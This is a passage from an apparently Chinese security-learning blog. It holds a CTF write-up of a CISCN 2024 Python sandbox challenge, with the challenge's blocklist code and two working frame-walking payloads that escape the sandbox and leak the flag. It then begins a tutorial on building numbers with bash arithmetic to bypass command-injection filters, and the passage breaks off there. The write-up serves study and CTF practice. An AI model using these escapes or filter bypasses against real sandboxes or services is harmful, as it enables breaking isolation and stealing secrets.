<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">from</span> uuid <span class="keyword">import</span> uuid1</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">runner = <span class="built_in">open</span>(<span class="string">&quot;/app/runner.py&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).read()</span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).readline().strip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/run&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="built_in">id</span> = <span class="built_in">str</span>(uuid1())</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = request.json</span><br><span class="line">        <span class="built_in">open</span>(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).write(</span><br><span class="line">            runner.replace(<span class="string">&quot;THIS_IS_SEED&quot;</span>, flag).replace(<span class="string">&quot;THIS_IS_TASK_RANDOM_ID&quot;</span>, <span class="built_in">id</span>))</span><br><span class="line">        <span class="built_in">open</span>(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).write(data.get(<span class="string">&quot;code&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">        run = subprocess.run(</span><br><span class="line">            [<span class="string">&#x27;python&#x27;</span>, <span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>],</span><br><span class="line">            stdout=subprocess.PIPE,</span><br><span class="line">            stderr=subprocess.PIPE,</span><br><span class="line">            timeout=<span class="number">3</span></span><br><span class="line">        )</span><br><span class="line">        result = run.stdout.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        error = run.stderr.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(result, error)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">            <span class="string">&quot;result&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;result&#125;</span>\n<span class="subst">&#123;error&#125;</span>&quot;</span></span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">            <span class="string">&quot;result&quot;</span>: <span class="string">&quot;None&quot;</span></span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<p>runner.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">source_simple_check</span>(<span class="params">source</span>):</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check the source with pure string in string, prevent dangerous strings</span></span><br><span class="line"><span class="string">    :param source: source code</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> exit</span><br><span class="line">    <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">print</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        source.encode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> UnicodeEncodeError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;non-ascii is not permitted&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="string">&quot;__&quot;</span>, <span class="string">&quot;getattr&quot;</span>, <span class="string">&quot;exit&quot;</span>]:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> source.lower():</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">block_wrapper</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check the run process with sys.audithook, no dangerous operations should be conduct</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">audit</span>(<span class="params">event, args</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">str</span>, <span class="built_in">print</span></span><br><span class="line">        <span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="string">&quot;marshal&quot;</span>, <span class="string">&quot;__new__&quot;</span>, <span class="string">&quot;process&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;sys&quot;</span>, <span class="string">&quot;interpreter&quot;</span>, <span class="string">&quot;cpython&quot;</span>, <span class="string">&quot;open&quot;</span>, <span class="string">&quot;compile&quot;</span>, <span class="string">&quot;gc&quot;</span>]:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> (event + <span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(s) <span class="keyword">for</span> s <span class="keyword">in</span> args)).lower():</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">                os._exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> audit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source_opcode_checker</span>(<span class="params">code</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check the source in the bytecode aspect, no methods and globals should be load</span></span><br><span class="line"><span class="string">    :param code: source code</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> dis <span class="keyword">import</span> dis</span><br><span class="line">    <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">str</span></span><br><span class="line">    <span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> exit</span><br><span class="line"></span><br><span class="line">    opcodeIO = StringIO()</span><br><span class="line">    dis(code, file=opcodeIO)</span><br><span class="line">    opcode = opcodeIO.getvalue().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    opcodeIO.close()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> opcode:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">any</span>(x <span class="keyword">in</span> <span class="built_in">str</span>(line) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;LOAD_GLOBAL&quot;</span>, <span class="string">&quot;IMPORT_NAME&quot;</span>, <span class="string">&quot;LOAD_METHOD&quot;</span>]):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(x <span class="keyword">in</span> <span class="built_in">str</span>(line) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;randint&quot;</span>, <span class="string">&quot;randrange&quot;</span>, <span class="string">&quot;print&quot;</span>, <span class="string">&quot;seed&quot;</span>]):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([x <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;LOAD_GLOBAL&quot;</span>, <span class="string">&quot;IMPORT_NAME&quot;</span>, <span class="string">&quot;LOAD_METHOD&quot;</span>] <span class="keyword">if</span> x <span class="keyword">in</span> <span class="built_in">str</span>(line)]))</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">open</span></span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> addaudithook</span><br><span class="line">    <span class="keyword">from</span> contextlib <span class="keyword">import</span> redirect_stdout</span><br><span class="line">    <span class="keyword">from</span> random <span class="keyword">import</span> randint, randrange, seed</span><br><span class="line">    <span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line">    <span class="keyword">from</span> random <span class="keyword">import</span> seed</span><br><span class="line">    <span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">    source = <span class="built_in">open</span>(<span class="string">f&quot;/app/uploads/THIS_IS_TASK_RANDOM_ID.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">    source_simple_check(source)</span><br><span class="line">    source_opcode_checker(source)</span><br><span class="line">    code = <span class="built_in">compile</span>(source, <span class="string">&quot;&lt;sandbox&gt;&quot;</span>, <span class="string">&quot;exec&quot;</span>)</span><br><span class="line">    addaudithook(block_wrapper())</span><br><span class="line">    outputIO = StringIO()</span><br><span class="line">    <span class="keyword">with</span> redirect_stdout(outputIO):</span><br><span class="line">        seed(<span class="built_in">str</span>(time()) + <span class="string">&quot;THIS_IS_SEED&quot;</span> + <span class="built_in">str</span>(time()))</span><br><span class="line">        <span class="built_in">exec</span>(code, &#123;</span><br><span class="line">            <span class="string">&quot;__builtins__&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;randint&quot;</span>: randint,</span><br><span class="line">            <span class="string">&quot;randrange&quot;</span>: randrange,</span><br><span class="line">            <span class="string">&quot;seed&quot;</span>: seed,</span><br><span class="line">            <span class="string">&quot;print&quot;</span>: <span class="built_in">print</span></span><br><span class="line">        &#125;, <span class="literal">None</span>)</span><br><span class="line">    output = outputIO.getvalue()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;THIS_IS_SEED&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;这 runtime 你就嘎嘎写吧， 一写一个不吱声啊，点儿都没拦住！&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;bad code-operation why still happened ah?&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(output)</span><br></pre></td></tr></table></figure>

<p>关键代码，在runner.py中，如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">source_simple_check函数中：禁了<span class="string">&quot;__&quot;</span>, <span class="string">&quot;getattr&quot;</span>, <span class="string">&quot;exit&quot;</span></span><br><span class="line">block_wrapper函数中，禁了<span class="string">&quot;marshal&quot;</span>, <span class="string">&quot;__new__&quot;</span>, <span class="string">&quot;process&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;sys&quot;</span>, <span class="string">&quot;interpreter&quot;</span>, <span class="string">&quot;cpython&quot;</span>, <span class="string">&quot;open&quot;</span>, <span class="string">&quot;compile&quot;</span>, <span class="string">&quot;gc&quot;</span></span><br><span class="line">禁了gc模块</span><br><span class="line">source_opcode_checker函数要求opcode解释出来还不能有LOAD_GLOBAL、IMPORT_NAME、 LOAD_METHOD</span><br><span class="line"></span><br><span class="line">其他地方，这里将内建函数禁了，那么这里就用不了`<span class="built_in">next</span>()`函数</span><br><span class="line"><span class="built_in">exec</span>(code, &#123;</span><br><span class="line">            <span class="string">&quot;__builtins__&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;randint&quot;</span>: randint,</span><br><span class="line">            <span class="string">&quot;randrange&quot;</span>: randrange,</span><br><span class="line">            <span class="string">&quot;seed&quot;</span>: seed,</span><br><span class="line">            <span class="string">&quot;print&quot;</span>: <span class="built_in">print</span></span><br><span class="line">        &#125;, <span class="literal">None</span>)</span><br></pre></td></tr></table></figure>

<p>先看了一下其他师傅的wp，我最开始不是很懂为什么会得到flag的值，审计代码+测试代码搞懂了，首先注意下面这一个部分代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">open(f&quot;/app/uploads/&#123;id&#125;.py&quot;, &quot;w&quot;, encoding=&quot;UTF-8&quot;).write(</span><br><span class="line">            runner.replace(&quot;THIS_IS_SEED&quot;, flag).replace(&quot;THIS_IS_TASK_RANDOM_ID&quot;, id))</span><br></pre></td></tr></table></figure>

<p>这里应该是flag的值没有被改变，只是在写进去的时候被改变了，出题人就是在这里“不安好心”，先看测试代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">haha</span>():</span><br><span class="line">    flag=<span class="string">&quot;flag&#123;ajhduiahdu&#125;&quot;</span></span><br><span class="line">    <span class="built_in">open</span>(<span class="string">f&quot;/app/uploads/1234.py&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).write(</span><br><span class="line">        runner.replace(<span class="string">&quot;THIS_IS_SEED&quot;</span>, flag))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(dis.dis(haha))</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line"><span class="number">3</span>           <span class="number">0</span> LOAD_CONST               <span class="number">1</span> (<span class="string">&#x27;flag&#123;ajhduiahdu&#125;&#x27;</span>)</span><br><span class="line">              <span class="number">2</span> STORE_FAST               <span class="number">0</span> (flag)</span><br><span class="line"></span><br><span class="line">  <span class="number">4</span>           <span class="number">4</span> LOAD_GLOBAL              <span class="number">0</span> (<span class="built_in">open</span>)</span><br><span class="line">              <span class="number">6</span> LOAD_CONST               <span class="number">2</span> (<span class="string">&#x27;/app/uploads/1234.py&#x27;</span>)</span><br><span class="line">              <span class="number">8</span> LOAD_CONST               <span class="number">3</span> (<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">             <span class="number">10</span> LOAD_CONST               <span class="number">4</span> (<span class="string">&#x27;UTF-8&#x27;</span>)</span><br><span class="line">             <span class="number">12</span> LOAD_CONST               <span class="number">5</span> ((<span class="string">&#x27;encoding&#x27;</span>,))</span><br><span class="line">             <span class="number">14</span> CALL_FUNCTION_KW         <span class="number">3</span></span><br><span class="line">             <span class="number">16</span> LOAD_METHOD              <span class="number">1</span> (write)</span><br><span class="line"></span><br><span class="line">  <span class="number">5</span>          <span class="number">18</span> LOAD_GLOBAL              <span class="number">2</span> (runner)</span><br><span class="line">             <span class="number">20</span> LOAD_METHOD              <span class="number">3</span> (replace)</span><br><span class="line">             <span class="number">22</span> LOAD_CONST               <span class="number">6</span> (<span class="string">&#x27;THIS_IS_SEED&#x27;</span>)</span><br><span class="line">             <span class="number">24</span> LOAD_FAST                <span class="number">0</span> (flag)</span><br><span class="line">             <span class="number">26</span> CALL_METHOD              <span class="number">2</span></span><br><span class="line"></span><br><span class="line">  <span class="number">4</span>          <span class="number">28</span> CALL_METHOD              <span class="number">1</span></span><br><span class="line">             <span class="number">30</span> POP_TOP</span><br><span class="line">             <span class="number">32</span> LOAD_CONST               <span class="number">0</span> (<span class="literal">None</span>)</span><br><span class="line">             <span class="number">34</span> RETURN_VALUE</span><br><span class="line"><span class="literal">None</span></span><br></pre></td></tr></table></figure>

<p>可以看到字节码中已经有了完整的<code>THIS_IS_SEED</code>，所以在我们输出时肯定有这个被输出，但是这个被禁了，如下代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&quot;THIS_IS_SEED&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;这 runtime 你就嘎嘎写吧， 一写一个不吱声啊，点儿都没拦住！&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;bad code-operation why still happened ah?&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>这里限制了输出不能有<code>THIS_IS_SEED</code>，所以需要绕过，如何绕过呢</p>
<p>就是将被禁的字符分开打印出来，使得不会匹配整个字符串，直接给其他师傅的paylaod，学习一下构造方案：<br>jay17师傅：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">scq</span>():</span><br><span class="line">        <span class="keyword">yield</span> scq.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">    scq = scq()  <span class="comment">#生成器</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># frame = next(scq)  # 获取到生成器的栈帧对象</span></span><br><span class="line">    frame = [x <span class="keyword">for</span> x <span class="keyword">in</span> scq][<span class="number">0</span>] <span class="comment">#由于生成器也是迭代器，所以也可以获取到生成器的栈帧对象</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(frame)</span></span><br><span class="line">    <span class="comment"># print(frame.f_back)</span></span><br><span class="line">    gattr = frame.f_back.f_back.f_back.f_globals[<span class="string">&quot;_&quot;</span>*<span class="number">2</span>+<span class="string">&quot;builtins&quot;</span>+<span class="string">&quot;_&quot;</span>*<span class="number">2</span>]  <span class="comment">#[&#x27;_&#x27;&#x27;_bui&#x27;&#x27;ltins_&#x27;&#x27;_&#x27;]也行</span></span><br><span class="line">    <span class="built_in">dir</span> = gattr.<span class="built_in">dir</span></span><br><span class="line">    <span class="built_in">str</span> = gattr.<span class="built_in">str</span>  <span class="comment"># 获取str方法</span></span><br><span class="line"></span><br><span class="line">    getflag = frame.f_back.f_back.f_back.f_code</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">dir</span>(getflag))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>(getflag.co_consts):</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<p>审一下代码，三个点比较重要：</p>
<ul>
<li><p>利用字节码来读</p>
</li>
<li><p>在全局空间对应的内置空间获得函数，</p>
</li>
<li><p>其次就是下面这个代码了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>(getflag.co_consts):</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure></li>
</ul>
<p>前两个点不用说了，前面笔记有，主要看第三个点为什么可以这样读出来</p>
<p>直接给代码测试：</p>
<p>先给没有<code>str()</code>的结果：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag =<span class="string">&quot;aoidhjaiodhj&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">haha</span>():</span><br><span class="line">    <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">g=haha()</span><br><span class="line">c=<span class="built_in">next</span>(g)</span><br><span class="line">d=c.f_code.co_consts</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> d:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line">aoidhjaiodhj</span><br><span class="line">&lt;code <span class="built_in">object</span> haha at <span class="number">0x0000026423B663A0</span>, file <span class="string">&quot;D:\clx\ceshi.py&quot;</span>, line <span class="number">2</span>&gt;</span><br><span class="line">haha</span><br><span class="line"><span class="literal">None</span></span><br></pre></td></tr></table></figure>

<p>再来看看使用<code>str()</code>转换为字符串的结果：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag =<span class="string">&quot;aoidhjaiodhj&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">haha</span>():</span><br><span class="line">    <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">g=haha()</span><br><span class="line">c=<span class="built_in">next</span>(g)</span><br><span class="line">d=c.f_code.co_consts</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>(d):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Output(部分):</span><br><span class="line">(</span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">a</span></span><br><span class="line"><span class="string">o</span></span><br><span class="line"><span class="string">i</span></span><br><span class="line"><span class="string">d</span></span><br><span class="line"><span class="string">h</span></span><br><span class="line"><span class="string">j</span></span><br><span class="line"><span class="string">a</span></span><br><span class="line"><span class="string">i</span></span><br><span class="line"><span class="string">o</span></span><br><span class="line"><span class="string">d</span></span><br><span class="line"><span class="string">h</span></span><br><span class="line"><span class="string">j</span></span><br><span class="line"><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<p>对比可以看出这里当被转换为字符串时再使用for循环可以在读取一个字符就输出。这想到，牛逼。</p>
<p>还有<a href="https://boogipop.com/2024/05/27/CISCN%202024%20%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%20Web%20Writeup/">boogipop师傅</a>的，payload如下：</p>
<p>对flag字符串有过滤，如下构造：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">boogipop</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">        <span class="keyword">yield</span> pop.gi_frame.f_back.f_back.f_back</span><br><span class="line">    pop = exp()</span><br><span class="line">    <span class="keyword">for</span> exp <span class="keyword">in</span> pop:</span><br><span class="line">        boo=exp</span><br><span class="line">    <span class="keyword">return</span> boo</span><br><span class="line">kino=boogipop()</span><br><span class="line"><span class="built_in">print</span>(kino.f_code.co_consts[<span class="number">19</span>][<span class="number">1</span>:])</span><br></pre></td></tr></table></figure>

<p>主要了解一下<code>[19][1:]</code>，解答如下：</p>
<ol>
<li>**<code>[19]</code>**：<ul>
<li>获取常量池中的第 19 个常量。常量池包含所有字面值（如字符串、数字）、函数对象、<code>None</code>、以及其他常量。</li>
</ul>
</li>
<li>**<code>[1:]</code>**：<ul>
<li>对该常量（假设是字符串）进行切片操作，获取从第二个字符到最后一个字符的部分。</li>
</ul>
</li>
</ol>
<p>假设第 19 个常量是一个字符串 <code>hello world</code>。那么：</p>
<ul>
<li><code>kino.f_code.co_consts[19]</code> 将是 <code>&#39;hello world&#39;</code>。</li>
<li><code>kino.f_code.co_consts[19][1:]</code> 将是 <code>&#39;ello world&#39;</code>。</li>
</ul>
<p>因此，这段代码最终会打印 <code>kino.f_code.co_consts[19][1:]</code>，其中假设第 19 个常量是一个字符串，这个切片操作会打印出该字符串从第二个字符开始到最后的部分。</p>
<p>复现总结，栈帧逃逸个人感觉考的就是在逃逸过后怎么操作，这就靠对python基础知识的积累了。</p>
<p>笔记参考文章：<code>https://xz.aliyun.com/t/13635?time__1311=mqmxnQ0QiQi%3DDteDsD7md0%3DdG%3DdSMOkdxWD&amp;alichlgref=https%3A%2F%2Fwww.bing.com%2F</code></p>
<p><code>https://blog.csdn.net/spiritx/article/details/132504456</code></p>
<p><code>https://blog.csdn.net/MXB_1220/article/details/124638449</code></p>
<p><code>https://gairuo.com/p/python-function-code</code></p>
<p><code>https://www.cnblogs.com/yangmingxianshen/p/11252541.html</code></p>
<p><code>https://www.cnblogs.com/traditional/p/13524591.html</code></p>
]]></content>
      <categories>
        <category>Python漏洞</category>
        <category>Python栈帧逃逸</category>
      </categories>
  </entry>
  <entry>
    <title>rce之利用shell变量</title>
    <url>/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/</url>
    <content><![CDATA[<h3 id="rce-‘新’进阶"><a href="#rce-‘新’进阶" class="headerlink" title="rce ‘新’进阶"></a>rce ‘新’进阶</h3><p>现在稍微大型的比赛都不会考那些已经算是比较常见、常用、简单的绕过如简单的取反、自增等，需要进阶学习纪录一下。此为学习者笔记,还是<strong>强调知识点融会贯通</strong></p>
<span id="more"></span>

<h3 id="命令执行之构造数字"><a href="#命令执行之构造数字" class="headerlink" title="命令执行之构造数字"></a>命令执行之构造数字</h3><h5 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h5><p><strong>在linux中<code>$(())</code>用于算术运算</strong>，在这个表达式中，你可以放入任何想要计算的运算式。</p>
<p>先看下面这个式子：</p>
<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602213327932.png" alt="image-20240602213327932"></p>
<p>这个式子中并没有给出任何具体的运算内容，系统默认执行了一个空的算数运算。所以在没有明确运算目标的情况下，**<code>$(())</code>返回的默认值是0**。（同时注意，个人认为，注意看payload以及执行情况，<code>$(())</code>本生就会执行后返回结果，不需要套一个<code>eval()</code>这种类似的执行函数）</p>
<p>看看给了的正常的运算符</p>
<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602214355554.png" alt="image-20240602214355554"></p>
<p>重点来了，尝试将上面那个0取反<br><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602214522539.png" alt="image-20240602214522539"></p>
<p>得到-1，那么再取反一次<code>-2</code>看看<br><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602214739811.png" alt="image-20240602214739811"></p>
<p>这里又得到了1，linux中的取反操作时针对二进制进行的，那么现在就可以通过相加减获得数字。</p>
<p>比如想要获得1，就可以像上面一样构造，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $((~$(($((~$(())))+$((~$(())))))))</span><br></pre></td></tr></table></figure>

<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602215641095.png" alt="image-20240602215641095"></p>
<p>现在想要构造就很简单了，比如又想构造<code>2</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $(($((~$(($((~$(())))+$((~$(())))))))+$((~$(($((~$(())))+$((~$(())))))))))</span><br></pre></td></tr></table></figure>

<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602215758986.png" alt="image-20240602215758986"></p>
<p>这样就可以构造任意数字。</p>
<p><strong>同时注意加号在某些情况下可以省略</strong>（建议在去掉+号前先看看没去+号是什么样子的），比如那个生成1的payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原：</span><br><span class="line">echo $((~$(($((~$(())))+$((~$(())))))))</span><br><span class="line"></span><br><span class="line">去掉+号后</span><br><span class="line">echo $((~$(($((~$(())))$((~$(())))))))  如下图</span><br></pre></td></tr></table></figure>

<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602222226786.png" alt="image-20240602222226786"></p>
<p>成功执行。</p>
<p>但是注意，为什么要加某些情况下呢，比如下面这个测试：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $(($((~$(($((~$(())))+$((~$(())))))))+$((~$(($((~$(())))+$((~$(())))))))))</span><br><span class="line">生成2的payload，那么现在将+去掉，如下：</span><br><span class="line">echo $(($((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))))))))</span><br></pre></td></tr></table></figure>

